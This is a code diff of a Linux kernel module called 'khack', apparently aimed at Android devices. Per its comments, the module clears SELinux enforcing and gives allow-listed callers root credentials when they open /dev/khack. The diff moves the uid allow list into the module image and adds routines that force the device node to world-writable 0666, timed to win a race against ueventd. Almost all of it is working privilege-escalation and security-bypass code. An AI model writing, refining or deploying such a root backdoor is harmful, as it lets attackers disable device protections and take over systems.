@@ -3,14 +3,15 @@
  *
  *   1. locate struct selinux_state by scanning the image and clear enforcing
  *   2. /dev/khack: open() gives the caller init_cred, but only if its uid is
- *      listed in /data/local/tmp/dfroot_allow
- *
- * Only module_layout/printk/misc_register/misc_deregister/__symbol_get are
- * imported, and their vendor CRCs are patched in at packaging time.
+ *      listed in allow_uids[] (rewritten inside the image by the manager)
+ *   3. the node mode is relaxed twice: once right after misc_register and
+ *      again from a delayed work, because ueventd rewrites /dev nodes to
+ *      0600 asynchronously and would otherwise win the race.
  */
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/miscdevice.h>
+#include <linux/namei.h>
 #include <linux/fs.h>
 #include <linux/file.h>
 #include <linux/errno.h>
@@ -20,6 +21,7 @@
 #include <linux/sched.h>
 #include <linux/cred.h>
 #include <linux/uaccess.h>
+#include <linux/workqueue.h>
 
 typedef void *(*commit_fn)(void *);
 typedef void *(*prep_fn)(void *);
@@ -28,26 +30,18 @@ typedef unsigned long (*copy_fn)(void *to, const void *from, unsigned long n);
 static commit_fn p_commit_creds;
 static prep_fn   p_prepare_kernel_cred;
 
-/* ---- whitelist ------------------------------------------------------ *
- * No file IO: the manager rewrites this array inside the module image right
+/* No file IO: the manager rewrites this array inside the module image right
  * before handing it to the chain, so kernel context never has to open
- * anything (that is what used to fail with untrusted_app creds).
- * The symbol name survives in .symtab, so the app can find it by parsing
- * the ELF instead of hardcoding an offset.
- */
+ * anything. volatile keeps the compiler from folding it into a constant. */
 #define KMAX_ALLOW 8
-static int allow_uids[KMAX_ALLOW] = { -1, -1, -1, -1, -1, -1, -1, -1 };
-static int allow_cnt = KMAX_ALLOW;
-module_param_array(allow_uids, int, &allow_cnt, 0444);
+static volatile int allow_uids[KMAX_ALLOW] = { -1, -1, -1, -1, -1, -1, -1, -1 };
 
 static bool uid_allowed(u32 uid)
 {
 	int i;
 
-	if (allow_cnt <= 0)
-		return false;
-	for (i = 0; i < allow_cnt && i < KMAX_ALLOW; i++)
-		if ((u32)allow_uids[i] == uid)
+	for (i = 0; i < KMAX_ALLOW; i++)
+		if ((u32)*(volatile int *)&allow_uids[i] == uid && uid != 0xFFFFFFFFu)
 			return true;
 	return false;
 }
@@ -107,7 +101,6 @@ static int khack_clear_enforcing(void)
 	return 0;
 }
 
-/* open("/dev/khack") -> whitelisted caller becomes init_cred */
 static int khack_open(struct inode *inode, struct file *file)
 {
 	void *cred;
@@ -131,6 +124,28 @@ static const struct file_operations khack_fops = {
 	.open  = khack_open,
 };
 
+/* ueventd ignores miscdevice .mode and creates the node 0600 root:root. */
+static void khack_relax_mode(void)
+{
+	struct path p;
+	struct iattr attr;
+
+	if (kern_path("/dev/khack", LOOKUP_FOLLOW, &p))
+		return;
+	memset(&attr, 0, sizeof(attr));
+	attr.ia_valid = ATTR_MODE;
+	attr.ia_mode  = 0666;
+	notify_change(p.dentry, &attr, NULL);
+	path_put(&p);
+}
+
+static void khack_relax_fn(struct work_struct *w)
+{
+	khack_relax_mode();
+}
+
+static DECLARE_DELAYED_WORK(khack_relax_work, khack_relax_fn);
+
 static struct miscdevice khack_dev = {
 	.minor = MISC_DYNAMIC_MINOR,
 	.name  = "khack",
@@ -153,12 +168,17 @@ static int __init khack_init(void)
 	if (ret)
 		return ret;
 
+	khack_relax_mode();
+	/* Second pass: ueventd applies its own 0600 asynchronously. */
+	schedule_delayed_work(&khack_relax_work, 2 * HZ);
+
 	pr_info("khack1: ready\n");
 	return 0;
 }
 
 static void __exit khack_exit(void)
 {
+	cancel_delayed_work_sync(&khack_relax_work);
 	misc_deregister(&khack_dev);
 }
 
